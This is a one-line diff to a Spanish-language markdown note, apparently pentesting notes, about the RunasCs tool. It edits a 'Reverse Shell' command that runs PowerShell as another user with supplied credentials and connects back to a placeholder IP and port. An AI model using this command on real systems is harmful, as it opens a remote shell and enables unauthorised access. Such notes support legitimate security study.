@@ -3,7 +3,7 @@ RunasCs es una herramienta que nos permite ejecutar ciertos procesos en el domin
 ## Reverse Shell
 
 ```ruby
-./RunasCs.exe {usuario} {Password} "powershell.exe " -r {IP}:{PORT} 
+./RunasCs.exe {usuario} {Password} "powershell.exe" -r {IP}:{PORT} 
 ```
 
 
